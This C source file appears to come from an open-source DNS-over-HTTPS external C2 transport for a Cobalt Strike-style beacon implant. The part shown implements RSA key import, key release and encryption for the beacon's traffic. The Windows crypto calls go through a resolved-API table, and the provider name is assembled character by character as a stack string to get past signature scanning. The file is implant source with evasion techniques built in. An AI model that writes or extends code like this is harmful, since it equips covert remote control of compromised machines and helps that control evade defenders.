/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "../common.h"

/*-
 *
 * CryptRsaInit
 *
 * Purpose:
 *
 * Creates a key object for RSA
 *
-*/
DEFINESEC(B) BOOL CryptRsaInit( PBEACON_INSTANCE Ins )
{
	UCHAR Str[ MAX_PATH ];

	Str[0x00] = 'M';
	Str[0x01] = 'i';
	Str[0x02] = 'c';
	Str[0x03] = 'r';
	Str[0x04] = 'o';
	Str[0x05] = 's';
	Str[0x06] = 'o';
	Str[0x07] = 'f';
	Str[0x08] = 't';
	Str[0x09] = ' ';
	Str[0x0a] = 'E';
	Str[0x0b] = 'n';
	Str[0x0c] = 'h';
	Str[0x0d] = 'a';
	Str[0x0e] = 'n';
	Str[0x0f] = 'c';
	Str[0x10] = 'e';
	Str[0x11] = 'd';
	Str[0x12] = ' ';
	Str[0x13] = 'C';
	Str[0x14] = 'r';
	Str[0x15] = 'y';
	Str[0x16] = 'p';
	Str[0x17] = 't';
	Str[0x18] = 'o';
	Str[0x19] = 'g';
	Str[0x1a] = 'r';
	Str[0x1b] = 'a';
	Str[0x1c] = 'p';
	Str[0x1d] = 'h';
	Str[0x1e] = 'i';
	Str[0x1f] = 'c';
	Str[0x20] = ' ';
	Str[0x21] = 'P';
	Str[0x22] = 'r';
	Str[0x23] = 'o';
	Str[0x24] = 'v';
	Str[0x25] = 'i';
	Str[0x26] = 'd';
	Str[0x27] = 'e';
	Str[0x28] = 'r';
	Str[0x29] = ' ';
	Str[0x2a] = 'v';
	Str[0x2b] = '1';
	Str[0x2c] = '.';
	Str[0x2d] = '0';
	Str[0x2e] = 0x0;

	if ( Ins->api.CryptAcquireContextA( &Ins->key[0].Provider, NULL, Str, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportPublicKeyInfo( Ins->key[0].Provider, X509_ASN_ENCODING, Ins->key[0].Ptr, &Ins->key[0].Key ) )
		{
			return TRUE;
		};
		Ins->api.CryptReleaseContext( Ins->key[0].Provider, 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptRsaFree
 *
 * Purpose:
 *
 * Free's the associated keys for RSA
 *
-*/
DEFINESEC(B) VOID CryptRsaFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->key[0].Key );
	Ins->api.CryptReleaseContext( Ins->key[0].Provider, 0 );
};

/*-
 *
 * CryptRsaEncrypt
 *
 * Purpose:
 *
 * Encrypt's the buffer using RSA
 * PKCS #1 v1.5
 *
-*/
DEFINESEC(B) BOOL CryptRsaEncrypt( PBEACON_INSTANCE Ins, 
		                   PVOID	In, 
				   ULONG	InLen, 
				   PVOID*	Out,
				   ULONG*	OutLen )
{
	DWORD TxtLen = InLen;
	DWORD EncLen = InLen;

	if ( Ins->api.CryptEncrypt( Ins->key[0].Key, 0, TRUE, 0, NULL, &EncLen, TxtLen ) )
	{
		if ((*Out = Ins->api.LocalAlloc( LPTR, EncLen )))
		{
			RtlCopyMemory( *Out, In, InLen );

			if ( Ins->api.CryptEncrypt( Ins->key[0].Key, 0, TRUE, 0, *Out, &TxtLen, EncLen ) )
			{
				PBYTE A = *Out;
				BYTE  B = 0;

				for ( int i=0;i<TxtLen/2;++i ) 
				{
					B = A[i]; 
					A[i] = A[TxtLen - 1 - i]; 
					A[TxtLen - 1 - i] = B;
				};

				*OutLen = TxtLen; return TRUE;
			};
			Ins->api.LocalFree( *Out );
		};
	};
	*Out = NULL; *OutLen = 0; return FALSE;
};
